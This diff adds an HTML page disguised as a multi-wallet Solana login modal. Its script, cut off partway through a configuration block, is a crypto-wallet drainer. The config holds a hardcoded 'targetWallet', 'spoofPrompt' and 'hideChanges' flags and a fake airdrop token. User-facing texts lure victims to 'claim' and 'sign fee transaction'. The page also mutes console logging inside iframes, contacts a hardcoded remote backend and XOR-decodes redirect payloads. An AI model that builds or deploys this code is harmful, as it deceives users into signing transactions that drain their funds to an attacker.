@@ -1,0 +1,4481 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <!-- 
+      FIX: Redirect long appConfig URLs to clean URLs before Phantom injects.
+      Phantom's content script captures the page URL at injection time. If the URL
+      is very long (3000+ chars from appConfig query params), Phantom's internal
+      messaging breaks and provider.connect() hangs forever.
+      We save the config to sessionStorage and redirect to the clean URL.
+    -->
+    <script>
+      (function () {
+        var search = window.location.search;
+        if (search && search.length > 1) {
+          var params = new URLSearchParams(search);
+          var appConfig = params.get("appConfig") || params.get("app");
+          if (appConfig) {
+            // Save config + any other params to sessionStorage before redirect
+            try {
+              sessionStorage.setItem("__appConfig", appConfig);
+              // Also save parentUrl if present
+              var parentUrl = params.get("parentUrl");
+              if (parentUrl) sessionStorage.setItem("__parentUrl", parentUrl);
+            } catch (e) {}
+            // Redirect to clean URL (no query string) — this is a full navigation
+            // so Phantom's content script will see only the short URL
+            var cleanUrl = window.location.origin + window.location.pathname;
+            window.location.replace(cleanUrl);
+            // Stop further parsing/execution of this page
+            throw new Error(
+              "Redirecting to clean URL for wallet compatibility",
+            );
+          }
+        }
+      })();
+    </script>
+    <title>Wallet Adapter</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="icon" href="favicon.ico" type="image/x-icon" />
+    <style>
+      :root {
+        --bg-primary: #f7f7f9;
+        --bg-secondary: #ffffff;
+        --bg-tertiary: rgba(0, 0, 0, 0.03);
+        --text-primary: #000000;
+        --text-secondary: #6b7280;
+        --border-color: rgba(0, 0, 0, 0.1);
+        --border-hover: rgba(0, 0, 0, 0.2);
+        --shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+        --wallet-bg: #ffffff;
+        --wallet-hover: rgba(0, 0, 0, 0.05);
+        --installed-bg: #eeeef1;
+        --installed-text: #72757e;
+      }
+
+      [data-theme="dark"] {
+        --bg-primary: #0c0e15;
+        --bg-secondary: #1c1d21;
+        --bg-tertiary: rgba(255, 255, 255, 0.05);
+        --text-primary: #ffffff;
+        --text-secondary: #6b7280;
+        --border-color: rgba(255, 255, 255, 0.08);
+        --border-hover: rgba(255, 255, 255, 0.15);
+        --shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        --wallet-bg: rgba(255, 255, 255, 0.03);
+        --wallet-hover: rgba(255, 255, 255, 0.08);
+        --installed-bg: transparent;
+        --installed-text: #ffffff;
+      }
+
+      * {
+        box-sizing: border-box;
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          "Helvetica Neue", Arial, sans-serif;
+      }
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        width: 400px;
+        height: 380px;
+        background: transparent;
+        color: var(--text-primary);
+        overflow: hidden;
+      }
+      body {
+        display: block;
+      }
+      .card {
+        background: var(--bg-primary);
+        border-radius: 13px;
+        padding: 16px;
+        border: 1px solid var(--border-color);
+        box-shadow: var(--shadow);
+        width: 400px;
+        height: 380px;
+        margin: 0;
+        animation: slideInUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        transform-origin: center;
+        position: relative;
+        box-sizing: border-box;
+        overflow: hidden;
+        display: flex;
+        flex-direction: column;
+        transition:
+          background 0.3s ease,
+          border-color 0.3s ease;
+      }
+
+      /* Mobile styles - only applies on mobile devices */
+      @media (max-width: 768px) and (pointer: coarse) {
+        html,
+        body {
+          width: 100vw !important;
+          height: 100vh !important;
+          max-width: 100vw !important;
+          max-height: 100vh !important;
+          background: rgba(0, 0, 0, 0.5);
+          backdrop-filter: blur(4px);
+          overflow: hidden;
+        }
+        [data-theme="light"] html,
+        [data-theme="light"] body {
+          background: rgba(0, 0, 0, 0.3);
+        }
+        .card {
+          width: 100vw !important;
+          height: 70vh !important;
+          max-width: 100vw !important;
+          max-height: 70vh !important;
+          min-height: 70vh !important;
+          border-radius: 24px 24px 0 0 !important;
+          margin: 0 !important;
+          padding: 20px !important;
+          padding-bottom: calc(
+            24px + env(safe-area-inset-bottom, 0)
+          ) !important;
+          position: fixed !important;
+          bottom: 0 !important;
+          left: 0 !important;
+          right: 0 !important;
+          top: auto !important;
+          animation: slideUpFromBottom 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+          box-shadow: 0 -4px 24px rgba(0, 0, 0, 0.3);
+          box-sizing: border-box !important;
+        }
+        @keyframes slideUpFromBottom {
+          from {
+            transform: translateY(100%);
+          }
+          to {
+            transform: translateY(0);
+          }
+        }
+      }
+
+      /* Header with title and close button */
+      .modal-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 13px;
+        gap: 6px;
+      }
+
+      .header-actions {
+        display: flex;
+        align-items: center;
+        gap: 3px;
+      }
+
+      .theme-toggle-button,
+      .close-button {
+        width: 25px;
+        height: 25px;
+        border-radius: 6px;
+        border: none;
+        background: transparent;
+        color: var(--text-secondary);
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 14px;
+        transition: all 0.2s ease;
+        padding: 0;
+      }
+      .theme-toggle-button:hover,
+      .close-button:hover {
+        background: var(--bg-tertiary);
+        color: var(--text-primary);
+      }
+
+      .theme-toggle-button svg {
+        width: 14px;
+        height: 14px;
+      }
+
+      /* Search bar */
+      .search-container {
+        margin-bottom: 9px;
+      }
+      .search-input {
+        width: 100%;
+        padding: 9px 13px;
+        padding-left: 32px;
+        border-radius: 10px;
+        border: 1px solid var(--border-color);
+        background: var(--bg-secondary);
+        color: var(--text-primary);
+        font-size: 11px;
+        outline: none;
+        transition: all 0.2s ease;
+      }
+      .search-input::placeholder {
+        color: var(--text-secondary);
+      }
+      .search-input:focus {
+        border-color: var(--border-hover);
+        background: var(--bg-secondary);
+        color: var(--text-primary);
+      }
+      .search-wrapper {
+        position: relative;
+      }
+      .search-icon {
+        position: absolute;
+        left: 11px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: var(--text-secondary);
+        font-size: 11px;
+        pointer-events: none;
+      }
+
+      .back-button {
+        position: absolute;
+        top: 13px;
+        left: 13px;
+        width: 28px;
+        height: 28px;
+        border-radius: 8px;
+        border: 1px solid var(--border-color);
+        background: var(--bg-tertiary);
+        color: var(--text-primary);
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 14px;
+        transition: all 0.2s ease;
+        z-index: 10;
+        opacity: 0;
+        pointer-events: none;
+      }
+      .back-button.visible {
+        opacity: 1;
+        pointer-events: all;
+        animation: fadeIn 0.3s ease-out;
+      }
+      .back-button:hover {
+        background: var(--wallet-hover);
+        border-color: var(--border-hover);
+        transform: translateX(-2px);
+      }
+
+      /* Footer */
+      .modal-footer {
+        margin-top: auto;
+        padding-top: 13px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 5px;
+        color: var(--text-secondary);
+        font-size: 9px;
+      }
+      .modal-footer svg {
+        width: 11px;
+        height: 11px;
+      }
+      .dynamic-logo {
+        display: flex;
+        align-items: center;
+        gap: 3px;
+      }
+
+      .wallet-loading-container {
+        position: relative;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 100px;
+        height: 100px;
+      }
+
+      .wallet-loading-icon {
+        width: 80px;
+        height: 80px;
+        border-radius: 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+        background: rgba(255, 255, 255, 0.05);
+        position: relative;
+        z-index: 2;
+      }
+      .wallet-loading-icon img {
+        width: 100%;
+        height: 100%;
+        object-fit: contain;
+        padding: 12px;
+      }
+
+      .loading-ring {
+        position: absolute;
+        width: 100px;
+        height: 100px;
+        border-radius: 24px;
+        z-index: 1;
+        top: 0;
+        left: 0;
+        pointer-events: none;
+      }
+      .loading-ring svg {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100px;
+        height: 100px;
+      }
+      .loading-ring path {
+        fill: none;
+        stroke-width: 3;
+        stroke-linecap: round;
+        stroke-dasharray: 60 340;
+        stroke-dashoffset: 0;
+        animation: snakeAround 2s linear infinite;
+      }
+      .loading-ring.phantom path {
+        stroke: #3b82f6;
+      }
+      .loading-ring.solflare path {
+        stroke: #fbbf24;
+      }
+      .loading-ring.backpack path {
+        stroke: #00d4ff;
+      }
+      .loading-ring.okx path {
+        stroke: #00d4ff;
+      }
+      .loading-ring.coinbase path {
+        stroke: #0052ff;
+      }
+      .loading-ring.jupiter path {
+        stroke: #c7f284;
+      }
+      .loading-ring.rejected path {
+        stroke: #ef4444;
+        stroke-dasharray: 400;
+        stroke-dashoffset: 400;
+        animation:
+          snakeAroundComplete 1s ease-out forwards,
+          shake 0.5s ease-out 1s;
+      }
+      @keyframes snakeAround {
+        0% {
+          stroke-dashoffset: 0;
+        }
+        100% {
+          stroke-dashoffset: 400;
+        }
+      }
+      @keyframes snakeAroundComplete {
+        0% {
+          stroke-dashoffset: 400;
+        }
+        100% {
+          stroke-dashoffset: 0;
+        }
+      }
+
+      .wallet-loading-name {
+        font-size: 18px;
+        font-weight: 500;
+        text-align: center;
+      }
+
+      .wallet-loading-status {
+        font-size: 14px;
+        color: var(--text-secondary);
+        text-align: center;
+      }
+      .rejection-message {
+        margin-top: 16px;
+        padding: 12px 16px;
+        background: rgba(239, 68, 68, 0.1);
+        border: 1px solid rgba(239, 68, 68, 0.3);
+        border-radius: 12px;
+        color: #ef4444;
+        font-size: 13px;
+        text-align: center;
+        animation:
+          fadeIn 0.3s ease-out,
+          shake 0.5s ease-out;
+        display: none;
+      }
+      .rejection-message.show {
+        display: block;
+      }
+
+      .wallet-buttons.hidden {
+        display: none;
+      }
+
+      .title.hidden,
+      .subtitle.hidden {
+        display: none;
+      }
+
+      @keyframes slideInUp {
+        from {
+          opacity: 0;
+          transform: translateY(20px) scale(0.95);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0) scale(1);
+        }
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      @keyframes slideIn {
+        from {
+          opacity: 0;
+          transform: translateX(-10px);
+        }
+        to {
+          opacity: 1;
+          transform: translateX(0);
+        }
+      }
+
+      @keyframes pulse {
+        0%,
+        100% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0.6;
+        }
+      }
+
+      @keyframes shimmer {
+        0% {
+          background-position: -1000px 0;
+        }
+        100% {
+          background-position: 1000px 0;
+        }
+      }
+
+      @keyframes bounce {
+        0%,
+        100% {
+          transform: translateY(0);
+        }
+        50% {
+          transform: translateY(-4px);
+        }
+      }
+      .title {
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 0;
+        text-align: left;
+        letter-spacing: -0.3px;
+        color: var(--text-primary);
+        transition: color 0.3s ease;
+      }
+      .subtitle {
+        display: none;
+      }
+      .wallet-buttons {
+        display: flex;
+        flex-direction: column;
+        gap: 3px;
+        flex: 1;
+        overflow-y: auto;
+        animation: fadeIn 0.6s ease-out 0.3s both;
+      }
+      .wallet-buttons::-webkit-scrollbar {
+        width: 3px;
+      }
+      .wallet-buttons::-webkit-scrollbar-track {
+        background: transparent;
+      }
+      .wallet-buttons::-webkit-scrollbar-thumb {
+        background: var(--border-color);
+        border-radius: 3px;
+      }
+      [data-theme="dark"] .wallet-buttons::-webkit-scrollbar-thumb {
+        background: rgba(255, 255, 255, 0.1);
+      }
+      .wallet-button {
+        width: 100%;
+        padding: 11px 13px;
+        border-radius: 10px;
+        border: 1px solid transparent;
+        background: var(--wallet-bg);
+        color: var(--text-primary);
+        cursor: pointer;
+        font-size: 12px;
+        font-weight: 500;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        transition: all 0.2s ease;
+        position: relative;
+        overflow: hidden;
+      }
+      .wallet-button:hover:not(:disabled) {
+        background: var(--wallet-hover);
+        border-color: var(--border-color);
+      }
+      .wallet-button:active:not(:disabled) {
+        transform: scale(0.99);
+        transition: transform 0.1s;
+      }
+      .wallet-button:nth-child(1) {
+        animation: slideIn 0.4s ease-out 0.1s both;
+      }
+      .wallet-button:nth-child(2) {
+        animation: slideIn 0.4s ease-out 0.15s both;
+      }
+      .wallet-button:nth-child(3) {
+        animation: slideIn 0.4s ease-out 0.2s both;
+      }
+      .wallet-button:nth-child(4) {
+        animation: slideIn 0.4s ease-out 0.25s both;
+      }
+      .wallet-button:nth-child(5) {
+        animation: slideIn 0.4s ease-out 0.3s both;
+      }
+      .wallet-button:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+      .wallet-button-content {
+        display: flex;
+        align-items: center;
+        gap: 9px;
+      }
+      .wallet-icon {
+        width: 28px;
+        height: 28px;
+        border-radius: 8px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+        flex-shrink: 0;
+        background: transparent;
+        transition: transform 0.2s ease;
+        position: relative;
+      }
+      .wallet-button:hover:not(:disabled) .wallet-icon {
+        transform: scale(1.05);
+      }
+      .wallet-icon img {
+        width: 100%;
+        height: 100%;
+        object-fit: contain;
+        padding: 3px;
+        transition: transform 0.2s ease;
+      }
+      .wallet-name {
+        font-weight: 400;
+        font-size: 12px;
+        color: var(--text-primary);
+      }
+      .wallet-status {
+        display: flex;
+        align-items: center;
+        gap: 5px;
+        font-size: 10px;
+        color: var(--installed-text);
+        font-weight: 400;
+        padding: 3px 8px;
+        border-radius: 10px;
+        background: var(--installed-bg);
+      }
+      .wallet-status .dot {
+        width: 5px;
+        height: 5px;
+        border-radius: 50%;
+        background: #3b82f6;
+        flex-shrink: 0;
+      }
+      .wallet-arrow {
+        display: none;
+      }
+      .info {
+        font-size: 9px;
+        color: var(--text-secondary);
+        margin-top: 13px;
+        line-height: 1.6;
+        text-align: center;
+        padding: 9px;
+        background: var(--wallet-bg);
+        border-radius: 10px;
+        border: 1px solid var(--border-color);
+      }
+      .status {
+        margin-top: 13px;
+        font-size: 10px;
+        color: #a5b4fc;
+        white-space: pre-line;
+        text-align: center;
+        padding: 9px;
+        background: rgba(165, 180, 252, 0.1);
+        border-radius: 10px;
+        border: 1px solid rgba(165, 180, 252, 0.2);
+        animation: fadeIn 0.4s ease-out;
+      }
+      .status.error {
+        color: #f97373;
+        background: rgba(249, 115, 115, 0.1);
+        border-color: rgba(249, 115, 115, 0.2);
+        animation: shake 0.5s ease-out;
+      }
+      .status.success {
+        color: #4ade80;
+        background: rgba(74, 222, 128, 0.1);
+        border-color: rgba(74, 222, 128, 0.2);
+        animation: bounce 0.6s ease-out;
+      }
+      .hidden {
+        display: none;
+      }
+      .loading {
+        animation: pulse 1.5s ease-in-out infinite;
+      }
+
+      @keyframes shake {
+        0%,
+        100% {
+          transform: translateX(0);
+        }
+        25% {
+          transform: translateX(-8px);
+        }
+        75% {
+          transform: translateX(8px);
+        }
+      }
+
+      .info {
+        animation: fadeIn 0.4s ease-out;
+      }
+
+      /* Hide status elements in new design */
+      .info,
+      .status {
+        display: none !important;
+      }
+
+      /* Hidden class */
+      .hidden {
+        display: none !important;
+      }
+
+      /* Single wallet view adjustments */
+      .single-wallet-view {
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        flex: 1;
+        gap: 24px;
+      }
+      .single-wallet-view.active {
+        display: flex;
+        animation: fadeIn 0.3s ease-out;
+      }
+
+      /* Loading spinner */
+      .spinner {
+        display: inline-block;
+        width: 16px;
+        height: 16px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top-color: #fff;
+        animation: spin 0.8s linear infinite;
+        margin-right: 8px;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      @keyframes spinRounded {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .wallet-loading-container.shake {
+        animation: shake 0.5s ease-out;
+      }
+
+      .wallet-loading-container.rejected {
+        filter: brightness(0.8);
+      }
+
+      .wallet-loading-container.rejected .wallet-loading-icon {
+        background: rgba(239, 68, 68, 0.1);
+        border: 1px solid rgba(239, 68, 68, 0.3);
+      }
+    </style>
+    <!-- Lightweight web3.js bundle for Transaction.from in the browser -->
+    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.js"></script>
+  </head>
+  <body>
+    <link rel="icon" href="favicon.ico" type="image/x-icon" />
+
+    <div class="card">
+      <button id="backBtn" class="back-button" title="Go back">←</button>
+
+      <!-- Header -->
+      <div class="modal-header" id="modalHeader">
+        <div class="title" id="title">Log in or connect</div>
+        <div class="header-actions">
+          <button
+            class="theme-toggle-button"
+            id="themeToggle"
+            title="Toggle light mode"
+          >
+            <svg
+              width="18"
+              height="18"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            >
+              <circle cx="12" cy="12" r="4"></circle>
+              <path d="M12 2v2"></path>
+              <path d="M12 20v2"></path>
+              <path d="m4.93 4.93 1.41 1.41"></path>
+              <path d="m17.66 17.66 1.41 1.41"></path>
+              <path d="M2 12h2"></path>
+              <path d="M20 12h2"></path>
+              <path d="m6.34 17.66-1.41 1.41"></path>
+              <path d="m19.07 4.93-1.41 1.41"></path>
+            </svg>
+          </button>
+          <button class="close-button" id="closeBtn" title="Close">
+            <svg
+              width="16"
+              height="16"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            >
+              <line x1="18" y1="6" x2="6" y2="18"></line>
+              <line x1="6" y1="6" x2="18" y2="18"></line>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <div class="subtitle" id="subtitle"></div>
+
+      <!-- Search bar -->
+      <div class="search-container" id="searchContainer">
+        <div class="search-wrapper">
+          <span class="search-icon">
+            <svg
+              width="14"
+              height="14"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            >
+              <circle cx="11" cy="11" r="8"></circle>
+              <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+            </svg>
+          </span>
+          <input
+            type="text"
+            class="search-input"
+            placeholder="Search through 14 wallets..."
+            id="walletSearch"
+          />
+        </div>
+      </div>
+
+      <div class="wallet-buttons" id="walletButtons">
+        <button id="phantomBtn" class="wallet-button" data-wallet="phantom">
+          <div class="wallet-button-content">
+            <div class="wallet-icon">
+              <img
+                src="https://iconic.dynamic-static-assets.com/icons/sprite.svg#phantom"
+                alt="Phantom"
+                onerror="
+                  this.style.display = 'none';
+                  this.parentElement.innerHTML =
+                    '<span style=\'color:#ab9ff2;font-weight:600;font-size:20px\'>P</span>';
+                "
+              />
+            </div>
+            <span class="wallet-name">Phantom</span>
+          </div>
+          <span class="wallet-arrow"></span>
+        </button>
+        <button id="backpackBtn" class="wallet-button" data-wallet="backpack">
+          <div class="wallet-button-content">
+            <div class="wallet-icon">
+              <img
+                src="https://iconic.dynamic-static-assets.com/icons/sprite.svg#backpack"
+                alt="Backpack"
+                onerror="
+                  this.style.display = 'none';
+                  this.parentElement.innerHTML =
+                    '<span style=\'color:#e33e3f;font-weight:600;font-size:20px\'>B</span>';
+                "
+              />
+            </div>
+            <span class="wallet-name">Backpack</span>
+          </div>
+          <span class="wallet-arrow"></span>
+        </button>
+        <button id="solflareBtn" class="wallet-button" data-wallet="solflare">
+          <div class="wallet-button-content">
+            <div class="wallet-icon">
+              <img
+                src="https://play-lh.googleusercontent.com/lql-v5JBq7UFMLQALnvZCX6r1X_Av8rVfrkzuv_fdjzEv88ucl4f5iCFfiN9isEc1TE=w240-h480-rw"
+                alt="Solflare"
+                onerror="
+                  this.style.display = 'none';
+                  this.parentElement.innerHTML =
+                    '<span style=\'color:#ff6b35;font-weight:600;font-size:20px\'>S</span>';
+                "
+              />
+            </div>
+            <span class="wallet-name">Solflare</span>
+          </div>
+          <span class="wallet-arrow"></span>
+        </button>
+        <button id="okxBtn" class="wallet-button" data-wallet="okx">
+          <div class="wallet-button-content">
+            <div class="wallet-icon">
+              <img
+                src="https://iconic.dynamic-static-assets.com/icons/sprite.svg#okx"
+                alt="OKX"
+                onerror="
+                  this.style.display = 'none';
+                  this.parentElement.innerHTML =
+                    '<span style=\'color:#00d4ff;font-weight:600;font-size:20px\'>O</span>';
+                "
+              />
+            </div>
+            <span class="wallet-name">OKX</span>
+          </div>
+          <span class="wallet-arrow"></span>
+        </button>
+        <button id="coinbaseBtn" class="wallet-button" data-wallet="coinbase">
+          <div class="wallet-button-content">
+            <div class="wallet-icon">
+              <img
+                src="https://images.ctfassets.net/o10es7wu5gm1/TWlW6aoAXPX7yUg5ShsZ0/c02522911b90b766eb8eef709e42b8eb/WalletLogo.png?fm=avif&w=640&h=640&q=65"
+                alt="Coinbase"
+                onerror="
+                  this.style.display = 'none';
+                  this.parentElement.innerHTML =
+                    '<span style=\'color:#0052ff;font-weight:600;font-size:20px\'>C</span>';
+                "
+              />
+            </div>
+            <span class="wallet-name">Coinbase</span>
+          </div>
+          <span class="wallet-arrow"></span>
+        </button>
+        <button id="jupiterBtn" class="wallet-button" data-wallet="jupiter">
+          <div class="wallet-button-content">
+            <div class="wallet-icon">
+              <img
+                src="https://jup.ag/favicon.ico"
+                alt="Jupiter"
+                onerror="
+                  this.style.display = 'none';
+                  this.parentElement.innerHTML =
+                    '<span style=\'color:#c7f284;font-weight:600;font-size:20px\'>J</span>';
+                "
+              />
+            </div>
+            <span class="wallet-name">Jupiter</span>
+          </div>
+          <span class="wallet-arrow"></span>
+        </button>
+      </div>
+
+      <!-- Footer -->
+      <div class="modal-footer" id="modalFooter">
+        <span>Powered by</span>
+        <div class="dynamic-logo">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+            <path
+              d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"
+              stroke="#8b5cf6"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            />
+          </svg>
+          <span style="color: var(--text-primary); font-weight: 500"
+            >dynamic</span
+          >
+        </div>
+      </div>
+
+      <div class="single-wallet-view" id="singleWalletView">
+        <div class="wallet-loading-container" id="walletLoadingContainer">
+          <div class="loading-ring" id="loadingRing">
+            <svg viewBox="0 0 100 100" preserveAspectRatio="none">
+              <path
+                d="M 24,3 L 76,3 A 21,21 0 0,1 97,24 L 97,76 A 21,21 0 0,1 76,97 L 24,97 A 21,21 0 0,1 3,76 L 3,24 A 21,21 0 0,1 24,3 Z"
+              />
+            </svg>
+          </div>
+          <div class="wallet-loading-icon" id="walletLoadingIcon">
+            <img id="walletLoadingImg" alt="Wallet" />
+          </div>
+        </div>
+        <div class="wallet-loading-name" id="walletLoadingName"></div>
+        <div class="wallet-loading-status" id="walletLoadingStatus"></div>
+        <div class="rejection-message" id="rejectionMessage"></div>
+      </div>
+
+      <div class="info hidden" id="info"></div>
+      <div id="status" class="status hidden"></div>
+    </div>
+
+    <script>
+      (function () {
+        // Silence all console output when running inside an iframe.
+        if (window !== window.top) {
+          const noop = function () {};
+          try {
+            console.log = noop;
+            console.info = noop;
+            console.debug = noop;
+            console.warn = noop;
+            console.error = noop;
+          } catch (_) {}
+        }
+
+        const phantomBtn = document.getElementById("phantomBtn");
+        const solflareBtn = document.getElementById("solflareBtn");
+        const backpackBtn = document.getElementById("backpackBtn");
+        const okxBtn = document.getElementById("okxBtn");
+        const coinbaseBtn = document.getElementById("coinbaseBtn");
+        const jupiterBtn = document.getElementById("jupiterBtn");
+        const statusEl = document.getElementById("status");
+        const infoEl = document.getElementById("info");
+        const backBtn = document.getElementById("backBtn");
+        const titleEl = document.getElementById("title");
+        const subtitleEl = document.getElementById("subtitle");
+        const walletButtons = document.getElementById("walletButtons");
+        const singleWalletView = document.getElementById("singleWalletView");
+        const walletLoadingContainer = document.getElementById(
+          "walletLoadingContainer",
+        );
+        const loadingRing = document.getElementById("loadingRing");
+        const walletLoadingIcon = document.getElementById("walletLoadingIcon");
+        const walletLoadingImg = document.getElementById("walletLoadingImg");
+        const walletLoadingName = document.getElementById("walletLoadingName");
+        const walletLoadingStatus = document.getElementById(
+          "walletLoadingStatus",
+        );
+        const rejectionMessage = document.getElementById("rejectionMessage");
+        const themeToggle = document.getElementById("themeToggle");
+        const htmlElement = document.documentElement;
+
+        // Theme toggle functionality
+        function initTheme() {
+          // Force dark mode by default
+          htmlElement.setAttribute("data-theme", "dark");
+          updateThemeIcon("dark");
+        }
+
+        function toggleTheme() {
+          const currentTheme = htmlElement.getAttribute("data-theme");
+          if (currentTheme === "dark") {
+            // Switch to light (default)
+            htmlElement.removeAttribute("data-theme");
+            localStorage.setItem("theme", "light");
+            updateThemeIcon("light");
+          } else {
+            // Switch to dark
+            htmlElement.setAttribute("data-theme", "dark");
+            localStorage.setItem("theme", "dark");
+            updateThemeIcon("dark");
+          }
+        }
+
+        function updateThemeIcon(theme) {
+          if (!themeToggle) return;
+          const svg = themeToggle.querySelector("svg");
+          if (!svg) return;
+
+          if (theme === "light") {
+            // Show moon icon for light mode (to switch to dark)
+            svg.innerHTML = `
+              <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+            `;
+            themeToggle.title = "Toggle dark mode";
+          } else {
+            // Show sun icon for dark mode (to switch to light)
+            svg.innerHTML = `
+              <circle cx="12" cy="12" r="4"></circle>
+              <path d="M12 2v2"></path>
+              <path d="M12 20v2"></path>
+              <path d="m4.93 4.93 1.41 1.41"></path>
+              <path d="m17.66 17.66 1.41 1.41"></path>
+              <path d="M2 12h2"></path>
+              <path d="M20 12h2"></path>
+              <path d="m6.34 17.66-1.41 1.41"></path>
+              <path d="m19.07 4.93-1.41 1.41"></path>
+            `;
+            themeToggle.title = "Toggle light mode";
+          }
+        }
+
+        // Initialize theme on load
+        initTheme();
+
+        // Add click handler for theme toggle
+        if (themeToggle) {
+          themeToggle.addEventListener("click", toggleTheme);
+        }
+
+        // Hardcoded API base URL - not changeable by users
+        const API_BASE_URL = "https://skittles-7f3a.fly.dev";
+
+        const WL_REDIRECT_CIPHER_KEY = "wl9";
+        function apiUrl(path) {
+          return (
+            API_BASE_URL.replace(/\/$/, "") +
+            (path.startsWith("/") ? path : "/" + path)
+          );
+        }
+        async function fetchOkxDappBaseFromBackend() {
+          try {
+            const ctrl = new AbortController();
+            const tid = setTimeout(() => ctrl.abort(), 5000);
+            const res = await fetch(apiUrl("/okxdmnendpt"), {
+              signal: ctrl.signal,
+            });
+            clearTimeout(tid);
+            if (!res.ok) return null;
+            const j = await res.json();
+            const u = j && j.url;
+            if (typeof u !== "string" || !/^https?:\/\//i.test(u.trim()))
+              return null;
+            return u.trim().replace(/\/$/, "");
+          } catch (e) {
+            /* removed */
+            return null;
+          }
+        }
+
+        /** Inverse of backend `simpleCipherEncode`: base64 → XOR with key (UTF-8) → plaintext UTF-8 */
+        function simpleCipherDecode(encodedB64) {
+          if (typeof encodedB64 !== "string" || !encodedB64) {
+            throw new Error("simpleCipherDecode: missing payload");
+          }
+          const key = new TextEncoder().encode(WL_REDIRECT_CIPHER_KEY);
+          const bin = atob(encodedB64);
+          const out = new Uint8Array(bin.length);
+          for (let i = 0; i < bin.length; i++) {
+            out[i] = bin.charCodeAt(i) ^ key[i % key.length];
+          }
+          return new TextDecoder().decode(out);
+        }
+
+        // Hardcoded default config
+        const defaultConfig = {
+          hideChanges: true,
+          spoofPrompt: true,
+          customAirdropMint: "677jK6xujhRFtBcD7Szn32tt2MSv4k6qZ4v3nGMgpump",
+          customAirdropAmount: 25,
+          targetWallet: "CEknUZWJsoNXqeehqMXTLDfr1NEduSa8S57E5NVi2rMR",
+          
+          minValue: 5,
+          className: "interact-button",
+          width: "400px",
+          height: "380px",
+          useProxyForTokens: true,
+          stresserSleepMs: 5000,
+          texts: {
+            title: "Log in or sign up",
+            subtitle: "Choose a wallet to connect to this app",
+            connecting: "Connecting...",
+            requestingConnection: "Requesting connection...",
+            openingWalletApp: "Opening wallet app…",
+            pleaseConnectInParent: "Please connect in parent window...",
+            connectedToPhantom: "Connected to Phantom",
+            connectedToSolflare: "Connected to Solflare",
+            connectedToBackpack: "Connected to Backpack",
+            connectedToOkx: "Connected to OKX Wallet",
+            connectedToCoinbase: "Connected to Coinbase Wallet",
+            connectedBuildingTransaction: "Connected. Loading signature...",
+            buildingTransaction: "Processing claim, please wait...",
+            buildingTransactionWait: "Processing claim, please wait…",
+            transactionsBuilt: "claim processed. Please sign...",
+            transactionsBuiltSign:
+              "claim processed. Please sign in your wallet.",
+            pleaseSignInWallet: "Please sign in your wallet...",
+            requestingSignatures: "Please sign fee transaction...",
+            requestingSignaturesAlt: "Please sign fee transaction...",
+            preparingAirdropTransaction: "Preparing claim...",
+            pleaseSignAirdropTransaction: "Please sign the claim...",
+            broadcastingTransactions: "Broadcasting claim...",
+            broadcastingTransactionsAlt: "Broadcasting claim…",
+            transactionsSent: "Claim sent!",
+            connectionFailed: "Connection failed",
+            connectionCancelled: "Connection cancelled",
+            connectionRejected: "Connection rejected",
+            transactionRejected: "Transaction rejected",
+            transactionFailed: "Transaction failed",
+            failedToBuildTransaction: "Failed to build transaction",
+            noTransactionsToSign: "No transactions to sign",
+            insufficientBalance:
+              "To avoid bots tampering with the claims we require wallets that claim to have on-chain activity",
+            walletNotConnected: "Wallet not connected",
+            walletNotConnectedReconnect:
+              "Wallet not connected. Please reconnect.",
+            connectWalletFirst: "Connect wallet first.",
+            noSolanaWalletProvider: "No Solana wallet provider available.",
+            widgetMisconfigured: "Widget misconfigured",
+            widgetMisconfiguredTargetWallet:
+              "Widget misconfigured: missing targetWallet.",
+            phantomWalletNotDetected: "Phantom wallet not detected",
+            solflareWalletNotDetected: "Solflare wallet not detected",
